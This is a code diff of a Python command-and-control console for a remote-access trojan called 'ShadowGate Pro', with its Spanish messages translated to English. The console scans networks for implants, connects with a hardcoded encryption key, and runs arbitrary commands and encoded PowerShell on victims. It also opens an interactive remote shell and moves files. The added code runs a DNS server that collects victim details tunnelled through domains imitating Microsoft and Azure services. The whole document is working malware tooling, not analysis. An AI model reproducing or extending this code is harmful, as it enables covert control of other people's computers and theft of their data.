@@ -5,16 +5,60 @@ import json
 import struct
 import threading
 from cryptography.fernet import Fernet
-from termcolor import colored
 import pyfiglet
 import netifaces
 import time
 import select
 import base64
-import requests
-import os
-import subprocess
 import random
+from dnslib import DNSRecord, RR, A
+from dnslib.server import DNSServer
+
+
+class DNSReportReceiver:
+    def __init__(self):
+        self.encryption_key = b'EbFqsf2CJ6a8pRHtKiHe-V6R9uMXvPEO627-wzsx_k4='
+        self.cipher = Fernet(self.encryption_key)
+        self.received_ips = set()
+        self.received_systems = []
+
+    def decode_dns_data(self, encoded_data):
+        """Decodificar datos de DNS tunneling"""
+        try:
+            padding = (8 - len(encoded_data) % 8) % 8
+            encoded_data += '=' * padding
+            encrypted_data = base64.b32decode(encoded_data.upper())
+            decrypted_data = self.cipher.decrypt(encrypted_data)
+            system_info = json.loads(decrypted_data.decode())
+            return system_info
+        except Exception as e:
+            print(f"[!] Error decoding DNS data: {e}")
+            return None
+
+
+class DNSHandler:
+    def __init__(self, receiver):
+        self.receiver = receiver
+
+    def handle_request(self, request, handler):
+        domain = str(request.q.qname).rstrip('.')
+
+        # Check for our DNS tunneling domains
+        tunneling_domains = ['azure-update.com', 'windows-telemetry.com', 'microsoft-ocsp.net']
+        if any(tunnel_domain in domain for tunnel_domain in tunneling_domains):
+            subdomain = domain.split('.')[0]
+            system_info = self.receiver.decode_dns_data(subdomain)
+
+            if system_info:
+                print(f"[+] DNS Report received from: {system_info.get('public_ip', 'Unknown')}")
+                if system_info.get('public_ip') not in self.receiver.received_ips:
+                    self.receiver.received_ips.add(system_info.get('public_ip'))
+                    self.receiver.received_systems.append(system_info)
+
+        # Always return a valid response
+        reply = request.reply()
+        reply.add_answer(RR(domain, rdata=A("127.0.0.1"), ttl=60))
+        return reply
 
 
 class AdvancedShadowGateController:
@@ -23,24 +67,21 @@ class AdvancedShadowGateController:
         self.socket = None
         self.connected = False
         self.connection_persistent = False
-
-        # 🔑 CLAVE COMPATIBLE con el servidor mejorado
         self.encryption_key = b'EbFqsf2CJ6a8pRHtKiHe-V6R9uMXvPEO627-wzsx_k4='
         self.cipher = Fernet(self.encryption_key)
-
-        # Configuración avanzada
+        self.dns_receiver = DNSReportReceiver()
+        self.dns_server = None
         self.scan_timeout = 1
         self.command_timeout = 30
         self.reconnect_attempts = 3
 
     def scan_network_advanced(self, ports=[5560, 5555, 8080, 443]):
-        """Escanéo avanzado de red con múltiples puertos y técnicas"""
-        print(colored("🔍 Escaneo avanzado de red en progreso...", 'yellow'))
+        """Advanced network scanning with multiple ports and techniques"""
+        print("[*] Advanced network scanning in progress...")
 
         targets_found = []
 
         try:
-            # Obtener todas las interfaces de red
             interfaces = netifaces.interfaces()
 
             for interface in interfaces:
@@ -52,36 +93,25 @@ class AdvancedShadowGateController:
                                 ip = addr_info['addr']
                                 netmask = addr_info['netmask']
 
-                                # Calcular rango de red
                                 network = self.calculate_network(ip, netmask)
                                 if network:
-                                    print(colored(f"📡 Escaneando red: {network}", 'blue'))
+                                    print(f"[*] Scanning network: {network}")
                                     targets = self.scan_network_range(network, ports)
                                     targets_found.extend(targets)
-                except:
+                except Exception as e:
+                    print(f"[!] Interface error: {e}")
                     continue
 
-            return list(set(targets_found))  # Eliminar duplicados
+            return list(set(targets_found))
 
         except Exception as e:
-            print(colored(f"❌ Error en escaneo avanzado: {e}", 'red'))
-            return self.scan_network()  # Fallback al método básico
+            print(f"[!] Advanced scan error: {e}")
+            return self.scan_network_basic(ports)
 
-    def calculate_network(self, ip, netmask):
-        """Calcular dirección de red desde IP y máscara"""
-        try:
-            ip_parts = list(map(int, ip.split('.')))
-            mask_parts = list(map(int, netmask.split('.')))
-
-            network_parts = [ip_parts[i] & mask_parts[i] for i in range(4)]
-            return '.'.join(map(str, network_parts)) + '.0/24'
-        except:
-            return None
-
-    def scan_network_range(self, network_cidr, ports):
-        """Escanear rango de red específico"""
+    def scan_network_basic(self, ports=[5560]):
+        """Basic network scanning fallback"""
         targets = []
-        base_ip = network_cidr.split('/')[0][:-2]  # Remover /24 y último octeto
+        base_ip = "192.168.1."
 
         def scan_ip_port(ip, port):
             try:
@@ -92,7 +122,7 @@ class AdvancedShadowGateController:
 
                 if result == 0:
                     targets.append((ip, port))
-                    print(colored(f"   ✅ Objetivo: {ip}:{port}", 'green'))
+                    print(f"[+] Target found: {ip}:{port}")
             except:
                 pass
 
@@ -104,7 +134,53 @@ class AdvancedShadowGateController:
                 threads.append(thread)
                 thread.start()
 
-                # Limitar hilos concurrentes
+                if len(threads) >= 100:
+                    for t in threads:
+                        t.join()
+                    threads = []
+
+        for thread in threads:
+            thread.join()
+
+        return targets
+
+    def calculate_network(self, ip, netmask):
+        """Calculate network address from IP and mask"""
+        try:
+            ip_parts = list(map(int, ip.split('.')))
+            mask_parts = list(map(int, netmask.split('.')))
+
+            network_parts = [ip_parts[i] & mask_parts[i] for i in range(4)]
+            return '.'.join(map(str, network_parts)) + '.0/24'
+        except:
+            return None
+
+    def scan_network_range(self, network_cidr, ports):
+        """Scan specific network range"""
+        targets = []
+        base_ip = network_cidr.split('/')[0][:-2]
+
+        def scan_ip_port(ip, port):
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(self.scan_timeout)
+                result = sock.connect_ex((ip, port))
+                sock.close()
+
+                if result == 0:
+                    targets.append((ip, port))
+                    print(f"[+] Target: {ip}:{port}")
+            except:
+                pass
+
+        threads = []
+        for port in ports:
+            for i in range(1, 255):
+                ip = f"{base_ip}{i}"
+                thread = threading.Thread(target=scan_ip_port, args=(ip, port))
+                threads.append(thread)
+                thread.start()
+
                 if len(threads) >= 100:
                     for t in threads:
                         t.join()
@@ -116,19 +192,17 @@ class AdvancedShadowGateController:
         return targets
 
     def smart_connect(self, target_info=None):
-        """Conexión inteligente con múltiples estrategias"""
+        """Smart connection with multiple strategies"""
         if target_info:
             ip, port = target_info
             return self.connect(ip, port)
 
-        # Escaneo inteligente
         targets = self.scan_network_advanced()
 
         if not targets:
-            print(colored("❌ No se encontraron objetivos", 'red'))
+            print("[-] No targets found")
             return False
 
-        # Intentar conectar por orden de prioridad
         for target in targets:
             ip, port = target
             if self.connect(ip, port):
@@ -137,7 +211,7 @@ class AdvancedShadowGateController:
         return False
 
     def connect(self, ip, port=5560):
-        """Conectar al objetivo con manejo mejorado de errores"""
+        """Connect to target with improved error handling"""
         for attempt in range(self.reconnect_attempts):
             try:
                 self.target_ip = ip
@@ -147,25 +221,23 @@ class AdvancedShadowGateController:
                 self.connected = True
                 self.connection_persistent = True
 
-                print(colored(f"✅ Conectado persistentemente a {ip}:{port}", 'green'))
+                print(f"[+] Connected to {ip}:{port}")
 
-                # Iniciar hilo de keep-alive
                 self.start_keep_alive()
                 return True
 
             except Exception as e:
-                print(colored(f"❌ Intento {attempt + 1} fallado: {e}", 'red'))
+                print(f"[-] Connection attempt {attempt + 1} failed: {e}")
                 time.sleep(2)
 
         return False
 
     def start_keep_alive(self):
-        """Mantener conexión viva"""
+        """Keep connection alive"""
 
         def keep_alive():
             while self.connection_persistent and self.connected:
                 try:
-                    # Enviar heartbeat cada 30 segundos
                     time.sleep(30)
                     if self.connected:
                         heartbeat = {'type': 'heartbeat', 'data': {'status': 'alive'}}
@@ -177,7 +249,7 @@ class AdvancedShadowGateController:
         threading.Thread(target=keep_alive, daemon=True).start()
 
     def send_raw_command(self, command):
-        """Enviar comando sin procesar respuesta"""
+        """Send raw command without processing response"""
         if not self.connected:
             return False
 
@@ -191,9 +263,9 @@ class AdvancedShadowGateController:
             return False
 
     def send_command(self, command_type, data=None, expect_response=True):
-        """Enviar comando cifrado con timeout mejorado"""
+        """Send encrypted command with improved timeout"""
         if not self.connected:
-            print(colored("❌ No conectado. Usa connect() primero.", 'red'))
+            print("[-] Not connected. Use connect() first.")
             return None
 
         try:
@@ -203,64 +275,57 @@ class AdvancedShadowGateController:
                 'timestamp': time.time()
             }
 
-            # Cifrar comando
             encrypted_cmd = self.cipher.encrypt(json.dumps(command).encode())
 
-            # Enviar tamaño + datos
             self.socket.send(struct.pack('!I', len(encrypted_cmd)))
             self.socket.send(encrypted_cmd)
 
             if not expect_response:
-                return {'success': True, 'message': 'Comando enviado sin esperar respuesta'}
+                return {'success': True, 'message': 'Command sent without waiting for response'}
 
-            # Esperar respuesta con select para timeout
             ready = select.select([self.socket], [], [], self.command_timeout)
             if not ready[0]:
-                print(colored("⏰ Timeout esperando respuesta", 'yellow'))
-                return {'success': False, 'error': 'Timeout esperando respuesta'}
+                print("[-] Timeout waiting for response")
+                return {'success': False, 'error': 'Timeout waiting for response'}
 
-            # Recibir tamaño de respuesta
             size_data = self.socket.recv(4)
             if not size_data:
-                return {'success': False, 'error': 'No se recibió tamaño de respuesta'}
+                return {'success': False, 'error': 'No response size received'}
 
             size = struct.unpack('!I', size_data)[0]
             response_data = b''
 
-            # Recibir datos con timeout
             start_time = time.time()
             while len(response_data) < size:
                 if time.time() - start_time > self.command_timeout:
-                    print(colored("⏰ Timeout recibiendo datos", 'yellow'))
-                    return {'success': False, 'error': 'Timeout recibiendo datos'}
+                    print("[-] Timeout receiving data")
+                    return {'success': False, 'error': 'Timeout receiving data'}
 
                 chunk = self.socket.recv(min(4096, size - len(response_data)))
                 if not chunk:
                     break
                 response_data += chunk
 
-            # Descifrar respuesta
             decrypted_response = self.cipher.decrypt(response_data)
             return json.loads(decrypted_response.decode())
 
         except Exception as e:
-            print(colored(f"❌ Error enviando comando: {e}", 'red'))
+            print(f"[-] Error sending command: {e}")
             self.connected = False
-            return {'success': False, 'error': f'Error de conexión: {str(e)}'}
+            return {'success': False, 'error': f'Connection error: {str(e)}'}
 
     def execute_command(self, cmd, wait=True):
-        """Ejecutar comando en el objetivo"""
+        """Execute command on target"""
         return self.send_command('system_command', {'command': cmd}, wait)
 
     def execute_powershell(self, script):
-        """Ejecutar script PowerShell"""
-        # Codificar script en base64 para evitar problemas de comillas
+        """Execute PowerShell script"""
         encoded_script = base64.b64encode(script.encode('utf-16le')).decode()
         ps_command = f"powershell -EncodedCommand {encoded_script}"
         return self.execute_command(ps_command)
 
     def upload_file(self, local_path, remote_path):
-        """Subir archivo al objetivo"""
+        """Upload file to target"""
         try:
             with open(local_path, 'rb') as f:
                 file_data = base64.b64encode(f.read()).decode()
@@ -273,9 +338,8 @@ class AdvancedShadowGateController:
             return {'success': False, 'error': str(e)}
 
     def download_file(self, remote_path, local_path):
-        """Descargar archivo del objetivo"""
+        """Download file from target"""
         try:
-            # Primero leer el archivo en el objetivo
             result = self.execute_command(f'type "{remote_path}"')
             if result and result.get('success'):
                 file_data = base64.b64decode(result['output'])
@@ -287,7 +351,7 @@ class AdvancedShadowGateController:
             return {'success': False, 'error': str(e)}
 
     def get_system_info(self):
-        """Obtener información detallada del sistema"""
+        """Get detailed system information"""
         info_commands = {
             'systeminfo': 'systeminfo',
             'network': 'ipconfig /all',
@@ -309,7 +373,7 @@ class AdvancedShadowGateController:
         return results
 
     def file_explorer(self, path="C:\\"):
-        """Explorador de archivos avanzado"""
+        """Advanced file explorer"""
         commands = {
             'list': f'dir "{path}"',
             'details': f'fsutil file layout "{path}"',
@@ -328,7 +392,7 @@ class AdvancedShadowGateController:
         return results
 
     def persistence_check(self):
-        """Verificar métodos de persistencia en el objetivo"""
+        """Check persistence methods on target"""
         checks = {
             'registry': 'reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
             'tasks': 'schtasks /query /fo list',
@@ -348,13 +412,13 @@ class AdvancedShadowGateController:
         return results
 
     def remote_shell(self):
-        """Shell remoto interactivo"""
-        print(colored("🐚 Iniciando shell remoto interactivo...", 'green'))
-        print(colored("   Escribe 'exit' para salir", 'yellow'))
+        """Interactive remote shell"""
+        print("[*] Starting interactive remote shell...")
+        print("    Type 'exit' to exit")
 
         while self.connected:
             try:
-                cmd = input(colored("remote-shell> ", 'cyan'))
+                cmd = input("remote-shell> ")
 
                 if cmd.lower() in ['exit', 'quit']:
                     break
@@ -364,191 +428,245 @@ class AdvancedShadowGateController:
                     if result and result.get('success'):
                         print(result['output'])
                     elif result:
-                        print(colored(f"Error: {result.get('error', 'Unknown error')}", 'red'))
+                        print(f"Error: {result.get('error', 'Unknown error')}")
                     else:
-                        print(colored("❌ No response from target", 'red'))
+                        print("[-] No response from target")
 
             except KeyboardInterrupt:
-                print(colored("\n🛑 Shell interrumpido", 'yellow'))
+                print("\n[*] Shell interrupted")
                 break
             except Exception as e:
-                print(colored(f"❌ Error en shell: {e}", 'red'))
+                print(f"[-] Shell error: {e}")
                 break
 
     def show_banner(self):
-        """Mostrar banner mejorado"""
+        """Show improved banner"""
         banner = pyfiglet.figlet_format("SHADOWGATE PRO", font="slant")
-        print(colored(banner, 'cyan'))
-        print(colored("🔥 Advanced Remote Control System", 'yellow'))
-        print(colored("📡 Conexión Persistente | 🚀 Comandos Avanzados", 'magenta'))
+        print(banner)
+        print("Advanced Remote Control System")
+        print("Persistent Connection | Advanced Commands | DNS Reporting")
         print("=" * 70)
 
+    def start_dns_server(self):
+        """Start DNS server for receiving reports"""
+        if self.dns_server:
+            print("[*] DNS server already running")
+            return
+
+        try:
+            handler = DNSHandler(self.dns_receiver)
+            self.dns_server = DNSServer(handler, port=53, address="0.0.0.0")
+
+            def dns_server_thread():
+                print("[+] Starting DNS server on port 53")
+                self.dns_server.start()
+
+            thread = threading.Thread(target=dns_server_thread, daemon=True)
+            thread.start()
+            print("[+] DNS server started successfully")
+
+        except Exception as e:
+            print(f"[-] Failed to start DNS server: {e}")
+            print("[*] Try running with administrator privileges")
+
+    def stop_dns_server(self):
+        """Stop DNS server"""
+        if self.dns_server:
+            self.dns_server.stop()
+            self.dns_server = None
+            print("[+] DNS server stopped")
+
+    def show_reported_systems(self):
+        """Show systems that have reported via DNS"""
+        if not self.dns_receiver.received_systems:
+            print("[-] No systems have reported yet")
+            return
+
+        print("[+] Systems reporting via DNS:")
+        for i, system in enumerate(self.dns_receiver.received_systems, 1):
+            print(
+                f"    {i}. {system.get('public_ip', 'Unknown')} - {system.get('username', 'Unknown')}@{system.get('hostname', 'Unknown')}")
+
     def interactive_menu(self):
-        """Menú interactivo mejorado"""
+        """Improved interactive menu"""
         self.show_banner()
 
         while True:
             print("\n" + "=" * 70)
-            print(colored("🎮 MENÚ DE CONTROL AVANZADO", 'magenta', attrs=['bold']))
+            print("CONTROL MENU")
             print("=" * 70)
 
             if self.connected:
-                status = colored("✅ CONECTADO", 'green')
+                status = "[+] CONNECTED"
                 if self.connection_persistent:
-                    status += colored(" (PERSISTENTE)", 'cyan')
-                print(f"{status} a: {self.target_ip}")
+                    status += " (PERSISTENT)"
+                print(f"{status} to: {self.target_ip}")
             else:
-                print(colored("❌ SIN CONEXIÓN", 'red'))
+                print("[-] NOT CONNECTED")
 
-            print("\n" + colored("🔗 Conexión", 'yellow'))
-            print("1. 🔍 Escaneo inteligente y conexión automática")
-            print("2. 📡 Conectar a IP específica")
-            print("3. 🚪 Desconectar")
+            print("\n[CONNECTION]")
+            print("1. Scan and auto-connect")
+            print("2. Connect to specific IP")
+            print("3. Disconnect")
 
-            print("\n" + colored("📊 Sistema", 'green'))
-            print("4. 🖥️  Información completa del sistema")
-            print("5. 📁 Explorador de archivos avanzado")
-            print("6. 🔍 Verificar persistencia")
+            print("\n[SYSTEM]")
+            print("4. Complete system information")
+            print("5. Advanced file explorer")
+            print("6. Check persistence")
 
-            print("\n" + colored("⚡ Ejecución", 'blue'))
-            print("7. 🐚 Shell remoto interactivo")
-            print("8. ⚡ Ejecutar comando personalizado")
-            print("9. 📜 Ejecutar script PowerShell")
+            print("\n[EXECUTION]")
+            print("7. Interactive remote shell")
+            print("8. Execute custom command")
+            print("9. Execute PowerShell script")
 
-            print("\n" + colored("📁 Archivos", 'cyan'))
-            print("10. ⬆️  Subir archivo al objetivo")
-            print("11. ⬇️️ Descargar archivo del objetivo")
+            print("\n[FILES]")
+            print("10. Upload file to target")
+            print("11. Download file from target")
 
-            print("\n" + colored("🛠️ Utilidades", 'magenta'))
-            print("12. 🔄 Re-escanear objetivos")
-            print("13. 🧪 Test de conexión")
-            print("0. 🏃 Salir")
+            print("\n[DNS REPORTING]")
+            print("12. Start DNS server")
+            print("13. Stop DNS server")
+            print("14. View reported systems")
+            print("15. Rescan for targets")
+
+            print("\n[UTILITIES]")
+            print("16. Test connection")
+            print("0. Exit")
             print("=" * 70)
 
-            choice = input(colored("👉 Selecciona opción: ", 'white')).strip()
+            choice = input("Select option: ").strip()
 
             if choice == "1":
                 if self.smart_connect():
-                    print(colored("🎯 Conexión inteligente exitosa!", 'green'))
+                    print("[+] Smart connection successful!")
                 else:
-                    print(colored("❌ No se pudo conectar", 'red'))
+                    print("[-] Could not connect")
 
             elif choice == "2":
-                target = input("IP del objetivo: ").strip()
-                port = input("Puerto (5560): ").strip() or "5560"
+                target = input("Target IP: ").strip()
+                port = input("Port (5560): ").strip() or "5560"
                 if target:
                     self.connect(target, int(port))
 
             elif choice == "3":
                 self.disconnect()
-                print(colored("🔌 Desconectado", 'yellow'))
+                print("[+] Disconnected")
 
             elif choice == "4" and self.connected:
-                print(colored("🖥️  Recopilando información del sistema...", 'yellow'))
+                print("[*] Gathering system information...")
                 info = self.get_system_info()
                 for section, content in info.items():
-                    print(f"\n{colored(f'📋 {section.upper()}:', 'green')}")
+                    print(f"\n[{section.upper()}]")
                     print(content[:500] + "..." if len(content) > 500 else content)
 
             elif choice == "5" and self.connected:
-                path = input("Ruta (ej: C:\\Users): ").strip() or "C:\\"
-                print(colored(f"📁 Explorando: {path}", 'yellow'))
+                path = input("Path (e.g., C:\\Users): ").strip() or "C:\\"
+                print(f"[*] Exploring: {path}")
                 result = self.file_explorer(path)
                 for action, output in result.items():
-                    print(f"\n{colored(f'📊 {action}:', 'cyan')}")
+                    print(f"\n[{action}]")
                     print(output[:1000] + "..." if len(output) > 1000 else output)
 
             elif choice == "6" and self.connected:
-                print(colored("🔍 Verificando persistencia...", 'yellow'))
+                print("[*] Checking persistence...")
                 persistence = self.persistence_check()
                 for method, output in persistence.items():
-                    print(f"\n{colored(f'📝 {method}:', 'magenta')}")
+                    print(f"\n[{method}]")
                     print(output[:1000] + "..." if len(output) > 1000 else output)
 
             elif choice == "7" and self.connected:
                 self.remote_shell()
 
             elif choice == "8" and self.connected:
-                cmd = input("Comando a ejecutar: ").strip()
+                cmd = input("Command to execute: ").strip()
                 if cmd:
                     result = self.execute_command(cmd)
                     if result and result.get('success'):
-                        print(colored("✅ Comando ejecutado:", 'green'))
+                        print("[+] Command executed:")
                         print(result.get('output', ''))
                         if result.get('error'):
-                            print(colored("⚠️  Errores:", 'yellow'))
+                            print("[!] Errors:")
                             print(result.get('error', ''))
                     else:
                         error_msg = result.get('error', 'Unknown error') if result else 'No response'
-                        print(colored(f"❌ Error ejecutando comando: {error_msg}", 'red'))
+                        print(f"[-] Error executing command: {error_msg}")
 
             elif choice == "9" and self.connected:
-                script = input("Script PowerShell: ").strip()
+                script = input("PowerShell script: ").strip()
                 if script:
                     result = self.execute_powershell(script)
                     if result and result.get('success'):
-                        print(colored("✅ Script ejecutado:", 'green'))
+                        print("[+] Script executed:")
                         print(result.get('output', ''))
                     else:
                         error_msg = result.get('error', 'Unknown error') if result else 'No response'
-                        print(colored(f"❌ Error ejecutando script: {error_msg}", 'red'))
+                        print(f"[-] Error executing script: {error_msg}")
 
             elif choice == "10" and self.connected:
-                local = input("Ruta local del archivo: ").strip()
-                remote = input("Ruta remota destino: ").strip()
+                local = input("Local file path: ").strip()
+                remote = input("Remote destination path: ").strip()
                 if local and remote:
                     result = self.upload_file(local, remote)
                     if result and result.get('success'):
-                        print(colored("✅ Archivo subido exitosamente", 'green'))
+                        print("[+] File uploaded successfully")
                     else:
                         error_msg = result.get('error', 'Unknown error') if result else 'No response'
-                        print(colored(f"❌ Error subiendo archivo: {error_msg}", 'red'))
+                        print(f"[-] Error uploading file: {error_msg}")
 
             elif choice == "11" and self.connected:
-                remote = input("Ruta remota del archivo: ").strip()
-                local = input("Ruta local destino: ").strip()
+                remote = input("Remote file path: ").strip()
+                local = input("Local destination path: ").strip()
                 if remote and local:
                     result = self.download_file(remote, local)
                     if result and result.get('success'):
-                        print(colored("✅ Archivo descargado exitosamente", 'green'))
+                        print("[+] File downloaded successfully")
                     else:
                         error_msg = result.get('error', 'Unknown error') if result else 'No response'
-                        print(colored(f"❌ Error descargando archivo: {error_msg}", 'red'))
+                        print(f"[-] Error downloading file: {error_msg}")
 
             elif choice == "12":
+                self.start_dns_server()
+
+            elif choice == "13":
+                self.stop_dns_server()
+
+            elif choice == "14":
+                self.show_reported_systems()
+
+            elif choice == "15":
                 targets = self.scan_network_advanced()
                 if targets:
-                    print(colored(f"🎯 Objetivos encontrados:", 'green'))
+                    print("[+] Targets found:")
                     for ip, port in targets:
-                        print(f"   {ip}:{port}")
+                        print(f"    {ip}:{port}")
                 else:
-                    print(colored("❌ No se encontraron objetivos", 'red'))
+                    print("[-] No targets found")
 
-            elif choice == "13" and self.connected:
-                print(colored("🧪 Probando conexión...", 'yellow'))
+            elif choice == "16" and self.connected:
+                print("[*] Testing connection...")
                 result = self.execute_command("echo Connection Test Successful")
                 if result and result.get('success'):
-                    print(colored("✅ Conexión funcionando correctamente", 'green'))
+                    print("[+] Connection working correctly")
                 else:
                     error_msg = result.get('error', 'Unknown error') if result else 'No response'
-                    print(colored(f"❌ Problemas de conexión: {error_msg}", 'red'))
+                    print(f"[-] Connection problems: {error_msg}")
 
             elif choice == "0":
                 self.disconnect()
-                print(colored("👋 Saliendo...", 'blue'))
+                self.stop_dns_server()
+                print("[+] Exiting...")
                 break
 
             else:
-                print(colored("❌ Opción no válida", 'red'))
+                print("[-] Invalid option")
 
             if choice != "0":
-                input(colored("\n📍 Presiona Enter para continuar...", 'white'))
+                input("\nPress Enter to continue...")
 
     def disconnect(self):
-        """Desconectar limpiamente"""
+        """Clean disconnect"""
         if self.connected:
             try:
-                # Enviar comando de desconexión
                 disconnect_cmd = {'type': 'disconnect', 'data': {}}
                 self.send_raw_command(disconnect_cmd)
             except:
@@ -558,69 +676,73 @@ class AdvancedShadowGateController:
                 self.connected = False
                 if self.socket:
                     self.socket.close()
-                print(colored("🔌 Desconectado", 'yellow'))
+                print("[+] Disconnected")
 
     def test_connection(self):
-        """Probar conexión automática mejorada"""
-        print(colored("🧪 Iniciando prueba avanzada de conexión...", 'yellow'))
+        """Improved automatic connection test"""
+        print("[*] Starting advanced connection test...")
 
         if self.smart_connect():
-            print(colored("✅ Conexión inteligente exitosa!", 'green'))
+            print("[+] Smart connection successful!")
 
-            # Probar comandos básicos
             tests = [
-                ("systeminfo", "Información del sistema"),
-                ("whoami", "Usuario actual"),
-                ("hostname", "Nombre del equipo")
+                ("systeminfo", "System information"),
+                ("whoami", "Current user"),
+                ("hostname", "Computer name")
             ]
 
             for cmd, description in tests:
-                print(colored(f"🧪 Probando: {description}...", 'yellow'))
+                print(f"[*] Testing: {description}...")
                 result = self.execute_command(cmd)
                 if result and result.get('success'):
-                    print(colored(f"✅ {description} funcionando:", 'green'))
+                    print(f"[+] {description} working:")
                     print(result.get('output', '')[:200] + "...")
                 else:
                     error_msg = result.get('error', 'Unknown error') if result else 'No response'
-                    print(colored(f"❌ Error en {description}: {error_msg}", 'red'))
+                    print(f"[-] Error in {description}: {error_msg}")
 
             self.disconnect()
         else:
-            print(colored("❌ No se pudo conectar automáticamente", 'red'))
+            print("[-] Could not connect automatically")
 
 
-# Función principal mejorada
 def main():
-    """Función principal del controlador avanzado"""
+    """Main function of the advanced controller"""
     controller = AdvancedShadowGateController()
 
-    # Banner inicial
     controller.show_banner()
 
-    # Opciones de inicio
-    print(colored("\n🚀 Opciones de inicio:", 'yellow'))
-    print("1. 🧪 Ejecutar test de conexión automática")
-    print("2. 🎮 Entrar directamente al menú interactivo")
-    print("3. 🔍 Solo escanear red")
+    print("\n[startup options]:")
+    print("1. Run automatic connection test")
+    print("2. Enter interactive menu directly")
+    print("3. Scan network only")
+    print("4. Start DNS server only")
 
-    choice = input(colored("👉 Selecciona opción: ", 'white')).strip()
+    choice = input("Select option: ").strip()
 
     if choice == "1":
         controller.test_connection()
-        input(colored("\n📍 Presiona Enter para continuar al menú...", 'white'))
+        input("\nPress Enter to continue to menu...")
         controller.interactive_menu()
     elif choice == "2":
         controller.interactive_menu()
     elif choice == "3":
         targets = controller.scan_network_advanced()
         if targets:
-            print(colored(f"🎯 Objetivos encontrados:", 'green'))
+            print("[+] Targets found:")
             for ip, port in targets:
-                print(f"   {ip}:{port}")
+                print(f"    {ip}:{port}")
         else:
-            print(colored("❌ No se encontraron objetivos", 'red'))
+            print("[-] No targets found")
+    elif choice == "4":
+        controller.start_dns_server()
+        try:
+            while True:
+                time.sleep(1)
+        except KeyboardInterrupt:
+            controller.stop_dns_server()
     else:
-        print(colored("ℹ️  Iniciando modo interactivo...", 'yellow'))
+        print("[*] Starting interactive mode...")
         controller.interactive_menu()
 
 
